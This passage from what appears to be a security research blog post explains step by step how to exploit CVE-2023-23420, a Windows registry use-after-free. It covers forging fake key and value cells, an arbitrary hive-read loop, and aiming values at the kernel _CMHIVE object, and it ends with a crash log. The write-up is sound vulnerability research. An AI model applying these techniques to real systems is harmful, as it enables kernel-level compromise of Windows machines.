 &lt;p class=&quot;ormwWEjHLs-c9&quot;&gt;&lt;span&gt;At the top of the hierarchy is the HKCU\Exploit key, which is the root of the entire exploit subtree.&lt;/span&gt;&lt;span&gt;&amp;nbsp;Its only role is to work as a &lt;/span&gt;&lt;span&gt;container for all the other keys and values we create.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;Below it, we have the &lt;/span&gt;&lt;span&gt;&amp;quot;TmpKeyName&amp;quot; &lt;/span&gt;&lt;span&gt;key, which is important for two reasons: first, it stores four values that will be used at a later stage to fill freed cells with controlled data (but are currently empty).&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;Second, this is the key on which we will perform the &amp;quot;rename&amp;quot; operation, which is the basis of the CVE-2023-23420 vulnerability.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;Below it are two more keys, &amp;quot;SubKey1&amp;quot; and &amp;quot;SubKey2&amp;quot;, which are also needed in the exploitation process for transactional deletion, each through a different view of their parent.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c3 ormwWEjHLs-c6&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c1 ormwWEjHLs-c7&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c9&quot;&gt;&lt;span&gt;Once we have this data layout arranged in the hive, we can proceed to trigger the memory corruption. We can do it exactly as described in &lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c13&quot;&gt;&lt;a href=&quot;https://project-zero.issues.chromium.org/issues/42451531&quot;&gt;the original report&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;in section &amp;quot;Operating on subkeys of transactionally renamed keys&amp;quot;, and demonstrated in the corresponding &lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c13&quot;&gt;&lt;a href=&quot;https://project-zero.issues.chromium.org/action/issues/42451531/attachments/59035473?download=false&quot;&gt;InconsistentSubkeyList.cpp&lt;/a&gt;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c1 ormwWEjHLs-c7&quot;&gt;&amp;nbsp;source code. In short, it involves the following steps:&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c9 ormwWEjHLs-c6&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c1 ormwWEjHLs-c7&quot;&gt;&lt;/span&gt;&lt;/p&gt;&lt;ol class=&quot;lst-kix_wh3djbl2z8na-0 start&quot; start=&quot;1&quot;&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c9 c16 li-bullet-0&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c1 ormwWEjHLs-c7&quot;&gt;Creating a lightweight transaction by calling the NtCreateRegistryTransaction syscall.&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c9 c16 li-bullet-0&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c1 ormwWEjHLs-c7&quot;&gt;Opening two different handles to the HKCU\Exploit\TmpKeyName key within our newly created transaction.&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c9 c16 li-bullet-0&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c1 ormwWEjHLs-c7&quot;&gt;Performing a transactional rename operation on one of these handles, changing the name to &amp;quot;Scratchpad&amp;quot;.&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c9 c16 li-bullet-0&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c1 ormwWEjHLs-c7&quot;&gt;Transactionally deleting the &amp;quot;SubKey1&amp;quot; and &amp;quot;SubKey2&amp;quot; keys, each through a different parent handle (one renamed, the other not).&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c9 c16 li-bullet-0&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c1 ormwWEjHLs-c7&quot;&gt;Committing the entire transaction by calling the NtCommitRegistryTransaction syscall.&lt;/span&gt;&lt;/li&gt;&lt;/ol&gt;
 &lt;p class=&quot;ormwWEjHLs-c9 ormwWEjHLs-c6&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c1 ormwWEjHLs-c7&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c9&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c1 ormwWEjHLs-c7&quot;&gt;After successfully executing these operations on a vulnerable system, the layout of our objects within the hive should change accordingly:&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c9&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c1 ormwWEjHLs-c7&quot;&gt;&lt;a href=&quot;https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjMb_hvJ2HtDPhJVHTCVOwcc8SMO-cGwEiU39h8oaxBmhanHjeJh3Ut5uwvolgJIloMQ6VUJQhYsFfkkxheLM2Fqz49e5P1OOirO01aA7fm_grsbz5MdSK-BLtc8oeSkeRmNKRfHjrr-Nm-nK2pezO4GC_bf9IXiJBDySdVdGr-VlxVPmKLC3FyS2_pZ4I/s1535/image8.png&quot; style=&quot;display: block; padding: 1em 0;text-align: center;&quot;&gt;&lt;img src=&quot;https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjMb_hvJ2HtDPhJVHTCVOwcc8SMO-cGwEiU39h8oaxBmhanHjeJh3Ut5uwvolgJIloMQ6VUJQhYsFfkkxheLM2Fqz49e5P1OOirO01aA7fm_grsbz5MdSK-BLtc8oeSkeRmNKRfHjrr-Nm-nK2pezO4GC_bf9IXiJBDySdVdGr-VlxVPmKLC3FyS2_pZ4I/s1200/image8.png&quot; border=&quot;0&quot; alt=&quot;At the top left, a box labeled &amp;quot;Exploit&amp;quot; is designated as a &amp;quot;Key node,&amp;quot; with a dotted line extending upwards from its &amp;quot;Key node&amp;quot; label. An arrow from &amp;quot;Exploit&amp;quot; points to a box labeled &amp;quot;Scratchpad,&amp;quot; also designated as a &amp;quot;Key node.&amp;quot; From &amp;quot;Scratchpad,&amp;quot; a red arrow points downwards to a dashed-outline box labeled &amp;quot;Free.&amp;quot; Another arrow extends to the right from &amp;quot;Scratchpad&amp;quot; to a vertically stacked group of four rectangular elements, collectively referred to as a &amp;quot;Value list&amp;quot; via a label to their left. From this &amp;quot;Value list,&amp;quot; four separate arrows point to the right, each connecting to a distinct container box. Each of these container boxes has a &amp;quot;Value node&amp;quot; label above it: The first container is &amp;quot;FakeKeyContainer.&amp;quot; The second is &amp;quot;ValueListContainer.&amp;quot; The third is &amp;quot;KernelAddrContainer.&amp;quot; The fourth is &amp;quot;KernelDataContainer.&amp;quot;&quot; style=&quot;max-height: 750px; max-width: 600px;&quot;title=&quot;At the top left, a box labeled &amp;quot;Exploit&amp;quot; is designated as a &amp;quot;Key node,&amp;quot; with a dotted line extending upwards from its &amp;quot;Key node&amp;quot; label. An arrow from &amp;quot;Exploit&amp;quot; points to a box labeled &amp;quot;Scratchpad,&amp;quot; also designated as a &amp;quot;Key node.&amp;quot; From &amp;quot;Scratchpad,&amp;quot; a red arrow points downwards to a dashed-outline box labeled &amp;quot;Free.&amp;quot; Another arrow extends to the right from &amp;quot;Scratchpad&amp;quot; to a vertically stacked group of four rectangular elements, collectively referred to as a &amp;quot;Value list&amp;quot; via a label to their left. From this &amp;quot;Value list,&amp;quot; four separate arrows point to the right, each connecting to a distinct container box. Each of these container boxes has a &amp;quot;Value node&amp;quot; label above it: The first container is &amp;quot;FakeKeyContainer.&amp;quot; The second is &amp;quot;ValueListContainer.&amp;quot; The third is &amp;quot;KernelAddrContainer.&amp;quot; The fourth is &amp;quot;KernelDataContainer.&amp;quot;&quot; /&gt;&lt;/a&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c9&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c1 ormwWEjHLs-c7&quot;&gt;We see that the &amp;quot;TmpKeyName&amp;quot; key has been renamed to &amp;quot;Scratchpad&amp;quot;, and both its subkeys have been released, but the freed cell of the second subkey still appears on its parent&amp;#39;s subkey list. At this point, we want to use the four values of the &amp;quot;Scratchpad&amp;quot; key to create our own fake data structure. According to it, the freed subkey will still appear as existing, and contain two values named &amp;quot;KernelAddr&amp;quot; and &amp;quot;KernelData&amp;quot;. Each of the &amp;quot;Container&amp;quot; values is responsible for imitating one type of object, and the most crucial role is played by the &amp;quot;FakeKeyContainer&amp;quot; value. Its backing buffer must perfectly align with the memory previously associated with the &amp;quot;SubKey1&amp;quot; key node. The diagram below illustrates the desired outcome:&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c9 ormwWEjHLs-c6&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c1 ormwWEjHLs-c7&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c9&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c1 ormwWEjHLs-c7&quot;&gt;&lt;a href=&quot;https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjkClsvYsr15b0LGQnB1loLZMTJgh-2F4QSWlJev8Ff34bMc0GNv41oBZZu7yFN98wNSsFLDaa6XyG4ZenikAle6XT3xtocYmyA3StTlUJWeRF2nU59krZfBFDGIH_dF2B2W9_WaSnTYWiahZfRMm7naV8CMHuPqyIR4Z_Y51CZXZENREuybnbqnBhFkCo/s1659/image17.png&quot; style=&quot;display: block; padding: 1em 0;text-align: center;&quot;&gt;&lt;img src=&quot;https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjkClsvYsr15b0LGQnB1loLZMTJgh-2F4QSWlJev8Ff34bMc0GNv41oBZZu7yFN98wNSsFLDaa6XyG4ZenikAle6XT3xtocYmyA3StTlUJWeRF2nU59krZfBFDGIH_dF2B2W9_WaSnTYWiahZfRMm7naV8CMHuPqyIR4Z_Y51CZXZENREuybnbqnBhFkCo/s1200/image17.png&quot; border=&quot;0&quot; alt=&quot;A diagram illustrates a complex data structure and flow, likely related to a system exploit. At the top left, a box labeled &amp;quot;Exploit,&amp;quot; designated as a &amp;quot;Key node&amp;quot; with a dotted line extending upwards, points to a box labeled &amp;quot;Scratchpad,&amp;quot; also a &amp;quot;Key node.&amp;quot; &amp;quot;Scratchpad&amp;quot; points to the right to a vertically stacked group of four rectangular elements, labeled &amp;quot;Value list.&amp;quot; This &amp;quot;Value list&amp;quot; has four arrows pointing to four &amp;quot;Value node&amp;quot; container boxes on the far right: &amp;quot;FakeKeyContainer,&amp;quot; &amp;quot;ValueListContainer,&amp;quot; &amp;quot;KernelAddrContainer,&amp;quot; and &amp;quot;KernelDataContainer.&amp;quot; An arrow extends downwards and to the right from &amp;quot;Scratchpad&amp;quot; to a box labeled &amp;quot;FakeKey,&amp;quot; which is also designated as &amp;quot;Data cell / fake key node.&amp;quot; From &amp;quot;FakeKey,&amp;quot; an arrow points right to a stack of two horizontal elements labeled &amp;quot;Data cell / fake value list,&amp;quot; and another thin arrow points upwards and right to &amp;quot;FakeKeyContainer.&amp;quot; From the &amp;quot;Data cell / fake value list,&amp;quot; its top element has an arrow pointing right to &amp;quot;KernelAddr&amp;quot; (labeled &amp;quot;Data cell / fake value node&amp;quot;), and its bottom element has an arrow pointing downwards and right to &amp;quot;KernelData&amp;quot; (labeled &amp;quot;Data cell / fake value node&amp;quot;). &amp;quot;KernelAddr&amp;quot; has a thin arrow pointing upwards and right to &amp;quot;KernelAddrContainer.&amp;quot; &amp;quot;KernelData&amp;quot; has a thin arrow pointing upwards and right to &amp;quot;KernelDataContainer.&amp;quot; A wavy line connects the right side of &amp;quot;KernelAddrContainer&amp;quot; to the left side of &amp;quot;KernelDataContainer,&amp;quot; and another wavy line extends from the right side of &amp;quot;KernelDataContainer&amp;quot; off to the right.&quot; style=&quot;max-height: 750px; max-width: 600px;&quot;title=&quot;A diagram illustrates a complex data structure and flow, likely related to a system exploit. At the top left, a box labeled &amp;quot;Exploit,&amp;quot; designated as a &amp;quot;Key node&amp;quot; with a dotted line extending upwards, points to a box labeled &amp;quot;Scratchpad,&amp;quot; also a &amp;quot;Key node.&amp;quot; &amp;quot;Scratchpad&amp;quot; points to the right to a vertically stacked group of four rectangular elements, labeled &amp;quot;Value list.&amp;quot; This &amp;quot;Value list&amp;quot; has four arrows pointing to four &amp;quot;Value node&amp;quot; container boxes on the far right: &amp;quot;FakeKeyContainer,&amp;quot; &amp;quot;ValueListContainer,&amp;quot; &amp;quot;KernelAddrContainer,&amp;quot; and &amp;quot;KernelDataContainer.&amp;quot; An arrow extends downwards and to the right from &amp;quot;Scratchpad&amp;quot; to a box labeled &amp;quot;FakeKey,&amp;quot; which is also designated as &amp;quot;Data cell / fake key node.&amp;quot; From &amp;quot;FakeKey,&amp;quot; an arrow points right to a stack of two horizontal elements labeled &amp;quot;Data cell / fake value list,&amp;quot; and another thin arrow points upwards and right to &amp;quot;FakeKeyContainer.&amp;quot; From the &amp;quot;Data cell / fake value list,&amp;quot; its top element has an arrow pointing right to &amp;quot;KernelAddr&amp;quot; (labeled &amp;quot;Data cell / fake value node&amp;quot;), and its bottom element has an arrow pointing downwards and right to &amp;quot;KernelData&amp;quot; (labeled &amp;quot;Data cell / fake value node&amp;quot;). &amp;quot;KernelAddr&amp;quot; has a thin arrow pointing upwards and right to &amp;quot;KernelAddrContainer.&amp;quot; &amp;quot;KernelData&amp;quot; has a thin arrow pointing upwards and right to &amp;quot;KernelDataContainer.&amp;quot; A wavy line connects the right side of &amp;quot;KernelAddrContainer&amp;quot; to the left side of &amp;quot;KernelDataContainer,&amp;quot; and another wavy line extends from the right side of &amp;quot;KernelDataContainer&amp;quot; off to the right.&quot; /&gt;&lt;/a&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c9&quot;&gt;&lt;span&gt;All the highlighted cells contain attacker-controlled data, which represent valid regf structures describing the HKCU\Exploit\Scratchpad\FakeKey key and its two values.&lt;/span&gt;&lt;span&gt;&amp;nbsp;Once&lt;/span&gt;&lt;span&gt;&amp;nbsp;this data layout is achieved, it becomes possible to open a handle to the &amp;quot;FakeKey&amp;quot; using standard APIs such as &lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c13&quot;&gt;&lt;a href=&quot;https://learn.microsoft.com/en-us/windows/win32/api/winreg/nf-winreg-regopenkeyexw&quot;&gt;RegOpenKeyEx&lt;/a&gt;&lt;/span&gt;&lt;span&gt;, and then operate on arbitrary cell indexes through its values.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;In reality, the process of crafting these objects after triggering the UAF is slightly more complicated than just setting data for four different values and requires the following steps:&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c9 ormwWEjHLs-c6&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c1 ormwWEjHLs-c7&quot;&gt;&lt;/span&gt;&lt;/p&gt;&lt;ol class=&quot;lst-kix_yn1qpyq8396u-0 start&quot; start=&quot;1&quot;&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c26 c16 li-bullet-0&quot;&gt;&lt;span&gt;Writing to the &lt;/span&gt;&lt;span&gt;&amp;quot;FakeKeyContainer&amp;quot; value with an initial, basic representation of the &amp;quot;FakeKey&amp;quot; key.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;At this stage, it is not important that the key node is entirely correct, but it must be of the appropriate length, and thus precisely cover the freed cell currently pointed to by the subkey list of the &amp;quot;Scratchpad&amp;quot; key.&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c26 c16 li-bullet-0&quot;&gt;&lt;span&gt;Setting the data for the other three container values &amp;ndash; again, not the final ones yet, but those that have the appropriate length and are filled with unique markers, so that they can be easily recognized&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c1 ormwWEjHLs-c7&quot;&gt;&amp;nbsp;later on.&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c26 c16 li-bullet-0&quot;&gt;&lt;span&gt;Launching an info-leak loop to find the three cell indexes corresponding to the data cells of the &amp;quot;ValueListContainer&amp;quot;, &amp;quot;KernelAddrContainer&amp;quot; and &amp;quot;KernelDataContainer&amp;quot; values, as well as a cell index of a valid security descriptor.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;This logic relies on abusing the _CM_KEY_NODE.Class and _CM_KEY_NODE.ClassLength fields of the &amp;quot;FakeKey&amp;quot; to point them to the data in the hive that we want to read.&lt;/span&gt;&lt;span&gt;&amp;nbsp;Specifically, t&lt;/span&gt;&lt;span&gt;he ClassLength member is set to 0xFFC, and the Class member is set to indexes 0x80000000, 0x80001000, 0x80002000, ... &lt;/span&gt;&lt;span&gt;in subsequent loop iterations&lt;/span&gt;&lt;span&gt;.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;This enables a kind of &amp;quot;arbitrary hive read&amp;quot; primitive, and the reading can be achieved by calling &lt;/span&gt;&lt;span&gt;the &lt;/span&gt;&lt;span&gt;NtEnumerateKey syscall on the &amp;quot;Scratchpad&amp;quot; key with the KeyNodeInformation class, which &lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c13&quot;&gt;&lt;a href=&quot;https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/ns-wdm-_key_node_information&quot;&gt;returns&lt;/a&gt;&lt;/span&gt;&lt;span&gt;, among other things, the class property for a given subkey.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;This way, we get all the information about the internal hive layout needed to construct the final form of each of the imitated cells.&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c26 c16 li-bullet-0&quot;&gt;&lt;span&gt;Using the above &lt;/span&gt;&lt;span&gt;information to set the correct data for each of the four cells: the key node of the &amp;quot;FakeKey&amp;quot; key with a valid security descriptor and index to the value list, the value list itself, and the value nodes of &amp;quot;KernelAddr&amp;quot; and &amp;quot;KernelData&amp;quot;.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;This makes &amp;quot;FakeKey&amp;quot; a full-fledged key as seen by Windows, but with all of its internal regf structures fully controlled by us.&lt;/span&gt;&lt;/li&gt;&lt;/ol&gt;
 &lt;p class=&quot;ormwWEjHLs-c9 ormwWEjHLs-c6&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c1 ormwWEjHLs-c7&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c9&quot;&gt;&lt;span&gt;If all of these steps are successful, we should be able to open the HKCU\Exploit\Scratchpad key in Regedit and see the current exploitation progress.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;An example from my test system is shown in the screenshot below.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;The extra &amp;quot;Filler&amp;quot; value is used to fill the space occupied by the old &amp;quot;TmpKeyName&amp;quot; key node freed during the rename operation.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;This is necessary so that the data of the &amp;quot;FakeKeyContainer&amp;quot; value correctly aligns with the freed cell of the &amp;quot;SubKey1&amp;quot; key, but I skipped this minor implementation detail in the above high-level description of the logic &lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c1 ormwWEjHLs-c7&quot;&gt;for the sake of clarity.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c9&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c1 ormwWEjHLs-c7&quot;&gt;&lt;a href=&quot;https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEg23yANbt1-DFZCjZvdMS_QhO11I1oHFGxqrECWLG3DUS5U3ix5HJAMnH2AtqeHIakYYrk_ETM32hMXDGeG6l7k27RjZGQKKIMJtF5SMZEljop9wuxdIyHD7uQVibrDrHMgF-wZHPPZTn8OZufWhGlHbV-qOoKBICBJeqPIt_uzJoQ368j6EGmdzeXdWkw/s1279/image1.png&quot; style=&quot;display: block; padding: 1em 0;text-align: center;&quot;&gt;&lt;img src=&quot;https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEg23yANbt1-DFZCjZvdMS_QhO11I1oHFGxqrECWLG3DUS5U3ix5HJAMnH2AtqeHIakYYrk_ETM32hMXDGeG6l7k27RjZGQKKIMJtF5SMZEljop9wuxdIyHD7uQVibrDrHMgF-wZHPPZTn8OZufWhGlHbV-qOoKBICBJeqPIt_uzJoQ368j6EGmdzeXdWkw/s1200/image1.png&quot; border=&quot;0&quot; alt=&quot;Example successful exploit&quot; style=&quot;max-height: 750px; max-width: 600px;&quot;title=&quot;Example successful exploit&quot; /&gt;&lt;/a&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;h3 class=&quot;ormwWEjHLs-c24&quot; id=&quot;h.hncjngwply3s&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c35 ormwWEjHLs-c14&quot;&gt;Step 2: Getting read/write access to the CMHIVE kernel object&lt;/span&gt;&lt;/h3&gt;
 &lt;p class=&quot;ormwWEjHLs-c9&quot;&gt;&lt;span&gt;Since we now have full control over some registry values, the next logical step would be to initialize them with a specially crafted OOB cell index and then &lt;/span&gt;&lt;span&gt;check &lt;/span&gt;&lt;span&gt;if we can actually access the kernel structure it represents.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;Let&amp;#39;s say that we set the type of the &amp;quot;KernelData&amp;quot; value to REG_BINARY, its length to 0x100, and the data cell index to the previously calculated value of 0xB2603000, which should point back at the hive&amp;#39;s _CMHIVE structure on the kernel pool.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;If we do this, and then browse to the &amp;quot;FakeKey&amp;quot; key in the Registry Editor, we will encounter an unpleasant surprise:&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c9&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c1 ormwWEjHLs-c7&quot;&gt;&lt;a href=&quot;https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgS1ufqCf8lmSadhf4ISFvIXq9eD3nspP3yAzPWIgCk0th8axCCHrxbp5Y30SRrNi3uVlV-C7hHc86nvicTAdMok90yeClgVNMbLhtTOM29uikXaZDbLnKhtrihe8GxGDKbSoYptzi1E7KgMjMzlh0pQCXDYD-0qRMizkpC-nY_bUONWj3fH6mv7rg5NHQ/s1024/image9.png&quot; style=&quot;display: block; padding: 1em 0;text-align: center;&quot;&gt;&lt;img src=&quot;https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgS1ufqCf8lmSadhf4ISFvIXq9eD3nspP3yAzPWIgCk0th8axCCHrxbp5Y30SRrNi3uVlV-C7hHc86nvicTAdMok90yeClgVNMbLhtTOM29uikXaZDbLnKhtrihe8GxGDKbSoYptzi1E7KgMjMzlh0pQCXDYD-0qRMizkpC-nY_bUONWj3fH6mv7rg5NHQ/s1024/image9.png&quot; border=&quot;0&quot; alt=&quot;Bluescreen!&quot; style=&quot;max-height: 750px; max-width: 600px;&quot;title=&quot;Bluescreen!&quot; /&gt;&lt;/a&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c9&quot;&gt;&lt;span&gt;This is &lt;/span&gt;&lt;span&gt;definitely &lt;/span&gt;&lt;span&gt;not the result we expected, and something must have gone wrong.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;If we investigate the system crash in WinDbg, we will get the following information:&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c9 ormwWEjHLs-c6&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c1 ormwWEjHLs-c7&quot;&gt;&lt;/span&gt;&lt;/p&gt;&lt;table class=&quot;ormwWEjHLs-c19&quot;&gt;&lt;tr class=&quot;ormwWEjHLs-c12&quot;&gt;&lt;td class=&quot;ormwWEjHLs-c11&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;ormwWEjHLs-c3 ormwWEjHLs-c6&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c14 ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c3&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c14 ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;Break instruction exception - code 80000003 (first chance)&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c3 ormwWEjHLs-c6&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c14 ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c3&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c14 ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;A fatal system error has occurred.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c3&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c14 ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;Debugger entered on first try; Bugcheck callbacks have not been invoked.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c3 ormwWEjHLs-c6&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c14 ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c3&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c14 ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;A fatal system error has occurred.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c3 ormwWEjHLs-c6&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c14 ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c3&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c14 ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;nt!DbgBreakPointWithStatus:&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c3&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c14 ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;fffff800`8061ff20 cc &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;int &amp;nbsp; &amp;nbsp; 3&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c3 ormwWEjHLs-c6&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2 ormwWEjHLs-c14&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c3&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c14 ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;0: kd&amp;gt; !analyze -v&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c3 ormwWEjHLs-c6&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c14 ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c3&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;*******************************************************************************&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c3&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;*&lt;/span&gt;&lt;/p&gt;
